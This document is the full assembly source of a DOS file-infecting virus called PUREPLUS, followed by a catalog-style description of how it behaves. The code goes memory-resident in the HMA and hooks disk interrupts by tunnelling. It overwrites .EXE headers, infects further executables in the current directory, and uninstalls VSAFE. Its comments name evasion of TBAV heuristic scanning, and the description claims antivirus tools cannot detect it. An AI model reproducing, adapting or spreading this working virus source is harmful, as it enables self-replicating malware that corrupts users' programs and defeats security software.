cseg            segment para    public  'code'
pureplus        proc    near
assume          cs:cseg

;-----------------------------------------------------------------------------

;designed by "Q" the misanthrope.

;-----------------------------------------------------------------------------

.186

ALLOCATE_HMA    equ     04a02h
CLOSE_HANDLE    equ     03e00h
COMMAND_LINE    equ     080h
COM_OFFSET      equ     00100h
CRITICAL_INT    equ     024h
DENY_NONE       equ     040h
DONT_SET_OFFSET equ     006h
DONT_SET_TIME   equ     040h
DOS_INT         equ     021h
DOS_SET_INT     equ     02500h
EIGHTEEN_BYTES  equ     012h
ENVIRONMENT     equ     02ch
EXEC_PROGRAM    equ     04b00h
EXE_SECTOR_SIZE equ     004h
EXE_SIGNATURE   equ     'ZM'
FAIL            equ     003h
FAR_INDEX_CALL  equ     01effh
FILENAME_OFFSET equ     0001eh
FILE_OPEN_MODE  equ     002h
FIND_FIRST      equ     04e00h
FIND_NEXT       equ     04f00h
FIRST_FCB       equ     05ch
FLUSH_BUFFERS   equ     00d00h
FOUR_BYTES      equ     004h
GET_DTA         equ     02f00h
GET_ERROR_LEVEL equ     04d00h
HARD_DISK_ONE   equ     081h
HIDDEN          equ     002h
HIGH_BYTE       equ     00100h
HMA_SEGMENT     equ     0ffffh
INT_13_VECTOR   equ     0004ch
JOB_FILE_TABLE  equ     01220h
KEEP_CF_INTACT  equ     002h
KEYBOARD_INT	equ	016h
MAX_SECTORS     equ     078h
MULTIPLEX_INT   equ     02fh
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
NULL            equ     00000h
ONLY_READ       equ     000h
ONLY_WRITE      equ     001h
ONE_BYTE        equ     001h
OPEN_W_HANDLE   equ     03d00h
PARAMETER_TABLE equ     001f1h
READ_A_SECTOR   equ     00201h
READ_ONLY       equ     001h
READ_W_HANDLE   equ     03f00h
REMOVE_NOP      equ     001h
RESET_CACHE     equ     00001h
RESIZE_MEMORY   equ     04a00h
SECOND_FCB      equ     06ch
SECTOR_SIZE     equ     00200h
SETVER_SIZE     equ     018h
SHORT_JUMP      equ     0ebh
SIX_BYTES       equ     006h
SMARTDRV        equ     04a10h
SYSTEM          equ     004h
SYS_FILE_TABLE  equ     01216h
TERMINATE_W_ERR equ     04c00h
THREE_BYTES     equ     003h
TWENTY_HEX      equ     020h
TWENTY_THREE    equ     017h
TWO_BYTES       equ     002h
UNINSTALL	equ	05945h
UN_SINGLE_STEP  equ     not(00100h)
VERIFY_3SECTORS equ     00403h
VOLUME_LABEL    equ     008h
VSAFE		equ	0fa01h
WRITE_A_SECTOR  equ     00301h
WRITE_W_HANDLE  equ     04000h
XOR_CODE        equ     (SHORT_JUMP XOR (low(EXE_SIGNATURE)))*HIGH_BYTE
PURE_CODE_IS_AT equ     00147h

;-----------------------------------------------------------------------------

bios_seg        segment at 0f000h	;just some dummy area that was needed
		org     00000h		;to have the compilier make a far jmp
old_int_13_addr label   word		;directive EAh later on
bios_seg        ends

;-----------------------------------------------------------------------------

		org     COM_OFFSET	;com files seem to always start here
com_code:

;-----------------------------------------------------------------------------

		jmp     short disable_vsafe

;-----------------------------------------------------------------------------

dummy_exe_head  dw      SIX_BYTES,TWO_BYTES,NULL,TWENTY_HEX,ONE_BYTE,HMA_SEGMENT
		dw	NULL,NULL,NULL,NULL,NULL,TWENTY_HEX
                			;simple EXE header that we have imbedded the virii into

;-----------------------------------------------------------------------------

		org     PURE_CODE_IS_AT	;here because many exe files have 00's after this location

;-----------------------------------------------------------------------------

ax_cx_di_si_cld proc    near		;sets varables for modifying sector
		mov     di,bx		;ES:BX is int 13 sector set di to bx
		add     di,PURE_CODE_IS_AT-COM_OFFSET
ax_cx_si_cld:   call    set_si		;get location of code in HMA
set_si:         pop     si		;and subtract the offset
		sub     si,word ptr (offset set_si)-word ptr (offset ax_cx_di_si_cld)
		mov     cx,COM_OFFSET+SECTOR_SIZE-PURE_CODE_IS_AT
		mov     ax,XOR_CODE	;ah is value to xor MZ to jmp 015C
		das			;set zero flag for the compare later on
		cld			;clear direction
		ret
ax_cx_di_si_cld endp

;-----------------------------------------------------------------------------

		org     high(EXE_SIGNATURE)+TWO_BYTES+COM_OFFSET
					;must be here because the MZ 4Dh,5Ah
					;.EXE header identifier gets changed to
                                        ;jmp 015C EAh,5Ah by changing one byte

;-----------------------------------------------------------------------------

disable_vsafe	proc	near		;while we are here lets allow other virii
                mov	dx,UNINSTALL	;it sure is nice to have a simple
		mov	ax,VSAFE	;call to do this
                int	KEYBOARD_INT
disable_vsafe	endp

;-----------------------------------------------------------------------------

alloc_memory    proc    near		;clear disk buffers so reads are done
		mov     ah,high(FLUSH_BUFFERS)
		int     DOS_INT		;from disk and not from memory
		xor     di,di		;set it to zero
		mov     ds,di		;to set the DS there
		mov     bh,high(SECTOR_SIZE)
		dec     di		;now set it to FFFFh
		mov     ax,ALLOCATE_HMA	;lets see how much memory is available
		int     MULTIPLEX_INT	;in the HMA - ES:DI points to begining
		mov     ax,SMARTDRV	;lets flush smartdrv as well for maximum
		mov     bx,RESET_CACHE	;infection.  it sure is nice to have
		int     MULTIPLEX_INT	;a simple call to do this
		mov     bl,SIX_BYTES	;for setting int 1 to tunnel
		inc     di		;if dos <5.0 or no HMA di is FFFFh
		jz      find_name	;if no memory don't install
		call    ax_cx_si_cld	;get varables for copy to HMA 
		rep     movs byte ptr es:[di],cs:[si]
alloc_memory    endp			;then copy it to ES:DI in HMA

;-----------------------------------------------------------------------------

set_int_13      proc    near		;setting int 1 vectors for tunnelling
		mov     ax,offset interrupt_one
		xchg    word ptr ds:[bx-TWO_BYTES],ax
		push    ax		;great way to set interrupts
		push    word ptr ds:[bx];just push them on the stack for latter
		mov     word ptr ds:[bx],cs
		xchg    cx,di		;cx was 0, di was last byte of HMA code
		mov     dl,HARD_DISK_ONE;doesn't really matter which drive
		pushf			;save the flags with TF cleared
		pushf			;push flags for simulated int 13 call
		pushf			;push flags for setting TF 
		mov     bp,sp		;get the stack pointer
		mov     ax,VERIFY_3SECTORS
		or      byte ptr ss:[bp+ONE_BYTE],al
		popf			;set TF and direction and call int 13
		dw      FAR_INDEX_CALL,INT_13_VECTOR
		popf			;restore flags
		pop     word ptr ds:[bx];and int 1 vectors back
		pop     word ptr ds:[bx-TWO_BYTES]
set_int_13      endp			;now int 13 has our code hooked into it

;-----------------------------------------------------------------------------

find_name       proc    near		;now lets find out who we are to reload
		mov     ds,word ptr cs:[bx+ENVIRONMENT-SIX_BYTES]
look_for_nulls: inc     bx		;ourselves to see if we are cleaned on the fly
		cmp     word ptr ds:[bx-FOUR_BYTES],di
		jne     look_for_nulls	;the plan is to goto the end of our
find_name       endp			;environment and look for 2 nulls

;-----------------------------------------------------------------------------

open_file       proc    near		;open current program and read header
		push    ds		;to see if the header was restored back
		push    bx		;save the program name on the stack
		mov     ch,THREE_BYTES	;read in 768 bytes of header
		call    open_n_read_exe	;open, read cx bytes, close file ds:bx
		push    cs		;set es to cs for compare of sector
		pop     es		;to infected sector
		mov     bx,dx		;get varables set correctly for compare
		call    convert_back	;compare them and convert them back
		pop     dx		;get file name again
		pop     ds
		jne     now_run_it	;if int 13 converted it back then run it
		push    ds		;else save file name again on stack
		push    dx
		mov     ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
		call    call_dos	;open current program for reads (don't set any alarms)
		push    bx		;save handle
		int     MULTIPLEX_INT	;get job file table for handle
		mov     dx,SYS_FILE_TABLE
		xchg    ax,dx		;done like this for anti TBAV hueristic scan
		mov     bl,byte ptr es:[di]
		int     MULTIPLEX_INT	;get SFT of handle to change ES:DI
		pop     bx		;get handle again
		mov     ch,high(SECTOR_SIZE)
		mov     ax,WRITE_W_HANDLE+DENY_NONE+ONLY_WRITE
		cmpsw			;simple code to change open file to
		stosb			;write back the cleaned header to file
		mov     dx,offset critical_error+COM_OFFSET
		int     DOS_INT		;this cleans the file if virii didn't load in HMA
		or      byte ptr es:[di+DONT_SET_OFFSET-THREE_BYTES],DONT_SET_TIME
		call    reclose_it	;set SFT to not change file date and time at close
		pop     dx		;get file name again from the stack
		pop     ds
open_file       endp

;-----------------------------------------------------------------------------

now_run_it      proc    near		;setup the exec of current program again
		push    cs		;like a spawned file
		pop     es		;es now cs
		mov     bx,offset exec_table
		mov     ah,high(RESIZE_MEMORY)
		int     DOS_INT		;first resize memory
		mov     si,offset critical_error+COM_OFFSET+PARAMETER_TABLE
		xchg    bx,si		;set si to where the table varables are
		mov     di,bx		;set di to where 14 byte exec table is to be made
		mov     ax,EXEC_PROGRAM	;set ax for file execute
set_table:      scasw			;advance 2 bytes in destination table
		movs    byte ptr es:[di],cs:[si]
		scasb			;move a byte then check if next byte is nonzero
		mov     word ptr cs:[di],cs
		je      set_table	;fill in the code segment into table and jmp if still zero
		call    call_dos	;exec program again
		mov     ax,FIND_FIRST	;need to infect more EXE files
		mov     dx,offset exe_file_mask
		mov     cx,READ_ONLY+HIDDEN+SYSTEM+VOLUME_LABEL
find_next_file: call    call_dos	;set cx to 15 to loop that many times
		mov     ah,high(GET_DTA);what was the old dta no need to set up a new one
		int     DOS_INT		;get it
		add     bx,FILENAME_OFFSET
		push    es		;get the filename into ds:bx
		pop     ds
		call    open_n_read_exe	;open, read cx bytes, close file ds:bx
		mov     ah,high(FIND_NEXT)
		loop    find_next_file	;loop until no more matches
done:           mov     ah,high(GET_ERROR_LEVEL)
		int     DOS_INT		;get spawned childs program errorlevel
		mov     ah,high(TERMINATE_W_ERR)
now_run_it      endp			;and return with that same errorlevel

;-----------------------------------------------------------------------------

call_dos        proc    near		;routine to call dos
		int     DOS_INT		;call dos
		jc      done		;error in doing so then exit
		xchg    ax,bx		;set bx to ax for open file stuff
		push    cs		;set ds to cs
		pop     ds		;for all sorts of stuff
		mov     ax,JOB_FILE_TABLE
		ret			;get job file table
call_dos        endp			;(done here for anti TBAV hueristic scan)

;-----------------------------------------------------------------------------

exec_table      db      COMMAND_LINE,FIRST_FCB,SECOND_FCB
					;these are used to create the 14 byte exec
                                        ;table to rerun program

;-----------------------------------------------------------------------------

open_n_read_exe proc    near		;opens file at ds:bx reads cx bytes then closes
		mov     dx,bx		;set dx to bx for dos call to open file
		mov     ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
		call    call_dos	;just open it for reading (don't sound any alarms)
		mov     dx,offset critical_error
		mov     ax,DOS_SET_INT+CRITICAL_INT
		int     DOS_INT		;see that the call_dos set ds to cs for setting critical error handler
		inc     dh		;just some dummy area outside in the heap to read the header of the file to
		mov     ah,high(READ_W_HANDLE)
		int     DOS_INT		;read it
reclose_it:     mov     ah,high(CLOSE_HANDLE)
		jmp     short call_dos	;goto close it
open_n_read_exe endp

;-----------------------------------------------------------------------------

interrupt_one   proc    far		;trace interrupt to imbed into int 13 chain at FFFF:????
		cmp     ax,VERIFY_3SECTORS
		jne     interrupt_ret	;if not doing int 13 stuff just leave
		push    ds		;push varables on stack
		pusha
		mov     bp,sp		;make bp the sp
		lds     si,dword ptr ss:[bp+EIGHTEEN_BYTES]
		cmp     word ptr ds:[si+ONE_BYTE],FAR_INDEX_CALL
		jne     go_back		;compare the instruction to a far call function
		mov     si,word ptr ds:[si+THREE_BYTES]
		cmp     word ptr ds:[si+TWO_BYTES],HMA_SEGMENT
		jne     go_back		;compare the address of the call to segment FFFFh
		cld			;if match then cx is pointing to the far call EAh at 
		mov     di,cx		;the end of virii that needs to be updated
		movsw			;move the address to our code
		movsw			;far addresses are 4 bytes long
		sub     di,word ptr (offset far_ptr_addr)-word ptr (offset int_13_entry)
		org     $-REMOVE_NOP	;now patch in our code into the call chain. only need to change offset because segment is already FFFFh
		mov     word ptr ds:[si-FOUR_BYTES],di
		and     byte ptr ss:[bp+TWENTY_THREE],high(UN_SINGLE_STEP)
go_back:        popa			;no longer need to singel step
		pop     ds		;pop off varables
critical_error: mov     al,FAIL		;set al to fail for critical error handler (al is a fail 03h anyway from above code ax verify_3sectors 0403h)
interrupt_ret:  iret			;dual useage of iret.  critical error and int 1
interrupt_one   endp			;after running int 1 routine through an int 13 chain we should be hooked in

;-----------------------------------------------------------------------------

exe_file_mask   db      '*.E*',NULL	;.EXE file mask (doesn't need to be specific) also anti TBAV hueristic scan

;-----------------------------------------------------------------------------

convert_back    proc    near		;will convert virii sector es:bx back to clean sector
		call    ax_cx_di_si_cld	;get all them varables
		repe    cmps byte ptr cs:[si],es:[di]
		jne     not_pure	;does it compare byte for byte with our code
		xor     byte ptr ds:[bx],ah
		call    ax_cx_di_si_cld	;if it does change the jmp 015C to an MZ EXE header signature
		rep     stosb		;and zero out all the code
not_pure:       ret			;go back to where you once belonged
convert_back    endp			

;-----------------------------------------------------------------------------

convert_to      proc    near		;will convert sector ds:bx into virii infected
		pusha			;save varables onto stack
		stc			;say that we failed
		pushf			;push failed onto the stack
                mov	ax,EXE_SIGNATURE;done this way for anti TBAV hueristic scan
		cmp     word ptr ds:[bx],ax
		jne     not_exe_header	;if not an EXE header then not interested
		mov     ax,word ptr ds:[bx+EXE_SECTOR_SIZE]
		cmp     ax,MAX_SECTORS	;is size of EXE small enough to run as a COM file
		ja      not_exe_header	;if not then not interested
		cmp     al,SETVER_SIZE	;was the file the length of SETVER.EXE if so then not interested
		je      not_exe_header	;(won't load correctly in CONFIG.SYS if SETVER.EXE is infected)
		cmp     word ptr ds:[bx+NEW_EXE_OFFSET],NEW_EXE_HEADER
		jae     not_exe_header	;was it a new EXE header (Windows etc) if so then not interested
		call    ax_cx_di_si_cld	;get all them varables
		pusha			;save'em
		repe    scasb		;was there nothin but 00's at offset 71 to 512 of the sector
		popa			;get'em again
		jne     not_exe_header	;if not then not interested
		xor     byte ptr ds:[bx],ah
		rep     movs byte ptr es:[di],cs:[si]
		popf			;if all criteria were met for infection then modify sector in memory and insert virii
		clc			;pop off the fail indicator
		pushf			;and push on the passed indicator
not_exe_header: popf			;get passed/failed indicator
		popa			;get varables from stack
		ret			;go back to where you once belonged
convert_to      endp

;-----------------------------------------------------------------------------

interrupt_13    proc    far		;will read the sectors at es:bx and infect them if necessary and or clean them on the fly
int_13_entry:   cmp     ah,high(READ_A_SECTOR)
		jb      call_old_int_13	;only interested in reads, writes and verifys
		cmp     ah,high(VERIFY_3SECTORS)
		ja      call_old_int_13	;if otherwise then go to old int 13
		push    ds		;save ds
		push    es		;so we can make ds the same as es and save a few bytes
		pop     ds
		call    convert_to	;try to convert it to a virii sector
		pushf			;set up for interrupt simulation
		push    cs		;push the cs onto the stack for the iret
		call    call_old_int_13	;if command was to write then an infected write occured else memory got overwritten with the read
		pushf			;save the result of the int 13 call
		call    convert_to	;does it need to be converted to a virii sector
		pusha			;save the varables onto the stack
		jc      do_convertback	;if not then see if it needs cleaning
		mov     ax,WRITE_A_SECTOR
		pushf			;now lets write the virii infected sector back to disk
		push    cs		;simulate an int 13 execution
		call    call_old_int_13	;and do it
do_convertback: call    convert_back	;does the sector need to be cleaned on the fly
		popa			;if it just wrote to the disk then it will need to be cleaned
		popf			;or if it is a virii infected sector then clean it
		pop     ds		;pop off the varables and the result of int 13 simulation done above
		retf    KEEP_CF_INTACT	;then leave this routine with the carry flag intact
interrupt_13    endp

;-----------------------------------------------------------------------------

signature	db	'Q'		;must leave my calling card

;-----------------------------------------------------------------------------

		org     COM_OFFSET+SECTOR_SIZE-ONE_BYTE
                			;must be a far jmp at the last of the sector
                                        ;the address of the jmp is in the heap area
                                        ;and is filled in by the int 1 trace routine

;-----------------------------------------------------------------------------

call_old_int_13 proc    near		;far call to actual int 13 that is loaded in the HMA by DOS
		jmp     far ptr old_int_13_addr
call_old_int_13 endp

;-----------------------------------------------------------------------------

		org     COM_OFFSET+SECTOR_SIZE
                			;overwrites the address of above but that address
                                        ;is not necessary until the virii goes resident in the HMA

;-----------------------------------------------------------------------------

goto_dos        proc    near		;this is our simple EXE file that we infected
		mov     ax,TERMINATE_W_ERR
		nop			;it just simply ends
far_ptr_addr:   int     DOS_INT		;terminate program
goto_dos        endp

;-----------------------------------------------------------------------------

pureplus        endp			;close up and go home
cseg            ends
end             com_code

;-----------------------------------------------------------------------------

Virus Name:  PUREPLUS
Aliases:
V Status:    New, Research Viron
Discovery:   March, 1994
Symptoms:    None - Pure Stealth
Origin:      USA
Eff Length:  441 Bytes
Type Code:   OReE - Extended HMA Memory Resident Overwriting .EXE Infector
Detection Method:  None
Removal Instructions:  See Below

General Comments:

	The PUREPLUS virus is a HMA memory resident overwriting direct action
	infector. The virus is a pure 100% stealth virus with no detectable
	symptoms.  No file length increase; overwritten .EXE files execute
	properly; no interrupts are directly hooked; no change in file date or
	time; no change in available memory; INT 12 is not moved; no cross
	linked files from CHKDSK; when resident the virus cleans programs on
	the fly; works with all 80?86 processors; VSAFE.COM does not detect
	any changes; Thunder Byte's Heuristic virus detection does not detect
	the virus; Windows 3.1's built in warning about a possible virus does
	not detect PUREPLUS.

        The PUREPLUS is a variation of the PURE virus that will cause
	VSAFE.COM to uninstall.

	The PUREPLUS virus will only load if DOS=HIGH in the CONFIG.SYS file.
	The first time an infected .EXE file is executed, the virus goes
	memory resident in the HMA (High Memory Area).  The hooking of INT 13
	is accomplished using a tunnelling technique, so memory mapping
	utilities will not map it to the virus in memory.  It then reloads the
	infected .EXE file, cleans it on the fly, then executes it.  After the
	program has been executed, PUREPLUS will attempt to infect 15 .EXE
	files in the current directory.

	If the PUREPLUS virus is unable to install in the HMA or clean the
	infected .EXE on the fly, the virus will reopen the infected .EXE file
	for read-only; modify the system file table for write; remove itself,
	and then write the cleaned code back to the .EXE file.  It then
	reloads the clean .EXE file and executes it.  The virus can not clean
	itself on the fly if the disk is compressed with DBLSPACE or STACKER,
	so it will clean the infected .EXE file and write it back.  It will
	also clean itself on an 8086 or 8088 processor.

	It will infect an .EXE if it is executed, opened for any reason or
	even copied.  When an uninfected .EXE is copied, both the source and
	destination .EXE file are infected.

	The PUREPLUS virus overwrites the .EXE header if it meets certain
	criteria.  The .EXE file must be less than 62K.  The file does not
	have an extended .EXE header.  The file is not SETVER.EXE.  The .EXE
	header must be all zeros from offset 71 to offset 512; this is where
	the PUREPLUS virus writes it code.  The PUREPLUS virus then changes
	the .EXE header to a .COM file.  Files that are READONLY can also be
	infected.

	To remove the virus from your system, change DOS=HIGH to DOS=LOW in
	your CONFIG.SYS file.  Reboot the system.  Then run each .EXE file
	less than 62k.  The virus will remove itself from each .EXE program
	when it is executed.  Or, leave DOS=HIGH in you CONFIG.SYS; execute
	an infected .EXE file, then use a tape backup unit to copy all your
	files.  The files on the tape have had the virus removed from them.
	Change DOS=HIGH to DOS=LOW in your CONFIG.SYS file.  Reboot the
	system.  Restore from tape all the files back to your system.
